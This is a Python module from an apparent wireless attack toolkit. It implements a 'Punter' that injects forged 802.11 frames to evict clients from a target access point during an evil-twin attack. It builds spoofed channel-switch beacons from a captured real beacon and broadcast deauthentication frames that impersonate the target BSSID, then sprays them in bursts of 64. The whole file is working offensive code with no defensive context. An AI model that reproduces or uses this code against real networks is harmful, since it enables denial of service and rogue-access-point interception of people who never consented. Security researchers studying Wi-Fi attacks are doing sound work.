"""Punter: injects the EvilTwin eviction frames (CSA and/or broadcast deauth) on a given interface.
Inject-only (no RX, no MAC), one burst per ``punt`` call; the campaign owns the cadence."""
from __future__ import annotations

import asyncio
import enum

from wifit3.dot11 import build_deauth
from wifit3.dot11.csa import build_csa_beacon

BURST_SIZE = 64
FRAME_GAP_SEC = 0.002
_BROADCAST = b"\xff\xff\xff\xff\xff\xff"
_DEAUTH_REASON = 7                               # class-3 frame from a nonassociated STA


class PuntMode(enum.Enum):
    CSA = "csa"
    DEAUTH = "deauth"
    BOTH = "both"
    NONE = "none"


class Punter:
    def __init__(self, mode: PuntMode, real_beacon: bytes, target_bssid: bytes, csa_channel: int):
        self._frames: list[bytes] = []
        if mode in (PuntMode.CSA, PuntMode.BOTH):
            self._frames.append(build_csa_beacon(real_beacon, csa_channel))
        if mode in (PuntMode.DEAUTH, PuntMode.BOTH):
            self._frames.append(build_deauth(_BROADCAST, target_bssid, target_bssid, _DEAUTH_REASON))

    async def punt(self, iface) -> None:
        """Spray one burst of each eviction frame on ``iface``."""
        for frame in self._frames:
            for _ in range(BURST_SIZE):
                await iface.send_no_wait(frame)
                await asyncio.sleep(FRAME_GAP_SEC)
